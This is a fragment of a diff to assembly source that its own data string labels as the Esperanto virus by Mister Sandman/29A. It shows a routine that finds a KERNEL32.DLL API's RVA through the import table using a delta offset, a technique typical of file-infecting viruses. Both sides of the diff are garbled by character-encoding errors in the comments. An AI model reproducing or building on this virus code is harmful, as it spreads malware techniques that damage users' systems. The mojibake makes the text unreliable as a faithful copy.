-; ÄÄ´ Look for the RVA of a given API by name ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ Look for the RVA of a given API by name â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ;
-;  Entry:
-;     ş EDX => Section ëelta-offset
-;     ş ESI => Import address table for KERNEL32.DLL
-;     ş EDI => Given API name to look for
+;   Entry:
+;     â–  EDX => Section Î´elta-offset
+;     â–  ESI => Import address table for KERNEL32.DLL
+;     â–  EDI => Given API name to look for
 ;
-;  Exit:
-;      EAX => RVA of the given API, or 0 if error
+;   Exit:
+;       EAX => RVA of the given API, or 0 if error
 
                 ; Look for a given API (in EDI) whose RVA we
                 ; are looking for by means of the structure
@@ -3088,7 +3088,7 @@ input_found:    pop     edi esi
 inp_not_found:  xor     eax,eax
                 ret
 
-; ÍÍ¹ Data area for the Intel modules ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+; â•â•â•£ Data area for the Intel modules â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 text_start      label   byte
 virus_author    db      '[Esperanto, by Mister Sandman/29A]',0
